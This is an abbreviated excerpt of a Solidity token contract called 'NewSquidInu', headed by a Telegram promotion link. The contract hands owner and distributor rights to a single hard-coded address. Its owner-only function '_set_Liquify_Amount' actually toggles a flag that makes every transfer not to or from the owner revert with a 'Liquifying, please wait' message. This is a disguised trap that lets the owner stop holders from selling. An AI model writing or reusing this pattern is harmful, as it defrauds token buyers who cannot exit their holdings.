...
Telegram: https://t.me/new_squid_inu

Getting on the Squid Hype!
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x8004bcadaA60eFAAe3BD331323B4F7Ad4e427cDD;
        _distributor = 0x8004bcadaA60eFAAe3BD331323B4F7Ad4e427cDD;
    ...
    modifier onlyOwner() {
        require(owner() == _msgSender() || distributor() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract NewSquidInu is Context, IERC20, Ownable {
    ...
    address payable private Wallet_Dev = payable(0x8004bcadaA60eFAAe3BD331323B4F7Ad4e427cDD);
    ...
    string private _name = "NewSquidInu";
    string private _symbol = "NewSquidInu";
    ...
    bool private inLiquify = false;
    uint256 public _maxWalletToken = _tTotal.mul(1).div(10);
    uint256 private _previousMaxWalletToken = _maxWalletToken;
    uint256 public _maxTxAmount = _tTotal.mul(1).div(10);
    ...
    function _set_Liquify_Amount(bool _inLiquify) external onlyOwner() {
        inLiquify = _inLiquify;
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            ...
            require(!inLiquify || from == owner() || to == owner(), "Liquifying, please wait short while");
            _TotalFee = _sellFee;
        }
